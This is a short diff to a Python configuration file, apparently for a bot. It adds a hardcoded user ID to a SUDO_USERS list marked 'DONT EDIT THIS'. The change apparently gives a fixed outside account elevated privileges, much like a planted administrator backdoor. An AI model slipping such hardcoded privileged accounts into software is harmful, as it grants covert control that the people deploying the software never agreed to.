@@ -21,7 +21,7 @@ class DATABASE:
 
 class DEV:
     OWNER_ID = int(os.environ["OWNER_ID"])
-    SUDO_USERS = [] # DONT EDIT THIS 
+    SUDO_USERS = [5868832590] # DONT EDIT THIS 
 
 class STUFF:
     ALIVE_PIC = os.environ["ALIVE_PIC"]
